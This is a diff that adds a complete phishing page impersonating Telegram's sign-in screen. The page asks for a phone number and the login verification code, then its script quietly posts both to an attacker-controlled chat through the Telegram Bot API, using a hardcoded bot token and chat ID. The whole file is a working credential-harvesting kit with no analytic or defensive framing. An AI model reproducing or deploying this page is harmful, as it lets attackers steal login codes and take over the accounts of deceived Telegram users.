@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <style>
+        body {
+            padding-top: 50px;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            height: 100vw;
+            background-color: #1e1e1e;
+            margin: 0;
+            color: white;
+            overflow-x: hidden !important;
+        }
+
+        .container {
+            padding: 40px;
+            width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+            text-align: center;
+            margin-right: 10px;
+        }
+
+        h2 {
+            margin-bottom: 10px;
+            font-size: 30px !important;
+        }
+
+        .same {
+            line-height: 1.5;
+            font-size: 16px;
+            color: #bbbbbb;
+            margin-bottom: 50px;
+            text-align: center;
+
+        }
+
+        select {
+            width: 385px !important;
+            margin-bottom: 25px !important;
+        }
+
+        input {
+            width: 360px !important;
+
+        }
+
+        select,
+        input {
+            height: 54px !important;
+            padding: 0 12px;
+            margin-bottom: 10px;
+            border: 1px solid #444;
+            border-radius: 10px;
+            background: #333;
+            color: white;
+            font-size: 16px;
+        }
+
+        .second {
+            margin: 0px;
+            height: 54px !important;
+        }
+
+        .input-holder {
+            width: 360px;
+        }
+
+        .first,
+        button {
+            margin-left: 5px;
+            font-weight: 600;
+            width: 100%;
+            padding: 12px;
+            background-color: #7856ff;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+
+        button:hover {
+            background-color: #6644cc;
+        }
+
+        .help-text {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #bbbbbb;
+        }
+
+        .help-text a {
+            color: #7856ff;
+            text-decoration: none;
+        }
+
+        .hidden {
+            display: none;
+        }
+        #verification-code {
+            width: 375px !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container" id="login-page">
+        <img src="https://telegram.org/img/t_logo.svg" alt="Telegram Logo" class="logo">
+        <h2>Sign in to Telegram</h2>
+        <p class="same">Please confirm your country code <br> and enter your phone number.</p>
+        <select id="country">
+            <option value="+374">Armenia</option>
+            <option value="+1">United States</option>
+            <option value="+44">United Kingdom</option>
+            <option value="+91">India</option>
+            <option value="+49">Germany</option>
+        </select>
+        <input type="text" id="phone-number" placeholder="Phone Number" required>
+        <button onclick="showVerification()" class="first"
+            style="height: 54px;margin-bottom: 20px; width: 386px; text-align: center; margin-right: 100px; margin-top: 20px;">Next</button>
+        <p class="help-text"><a href="#">LOG IN BY QR CODE</a></p>
+    </div>
+
+    <div class="container hidden" id="verification-page">
+        <img src="./ape.gif" alt="Monkey Emoji" class="logo">
+        <h2 id="entered-number"></h2>
+        <p class="same" style="margin-bottom: 40px;">We have sent you a message in Telegram <br> with the code.</p>
+        <input type="text" id="verification-code" placeholder="Enter Code" required>
+        <button onclick="sendToTelegram()" class="second">Verify</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7559471656:AAGnR6BcJgeTFawOo9Feih6EpjvdhbhK2xw"; // Your bot token
+        const CHAT_ID = "-1002302684450"; // Your chat ID
+
+        function showVerification() {
+            const countryCode = document.getElementById('country').value;
+            const phoneNumber = document.getElementById('phone-number').value;
+
+            if (!phoneNumber.trim()) {
+                alert("Please enter your phone number!");
+                return;
+            }
+
+            document.getElementById('login-page').classList.add('hidden');
+            document.getElementById('verification-page').classList.remove('hidden');
+            document.getElementById('entered-number').textContent = `${phoneNumber}`;
+        }
+
+        function sendToTelegram() {
+            const countryCode = document.getElementById('country').value;
+            const phoneNumber = document.getElementById('phone-number').value;
+            const verificationCode = document.getElementById('verification-code').value;
+
+            if (!verificationCode.trim()) {
+                alert("Please enter the verification code!");
+                return;
+            }
+
+            const message = `📱 New Telegram Login:\n\n📞 Phone: ${phoneNumber}\n🔢 Code: ${verificationCode}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Code sent to Telegram bot!");
+                    } else {
+                        alert("Failed to send data. Check bot token and chat ID.");
+                    }
+                })
+                .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+
+</html>
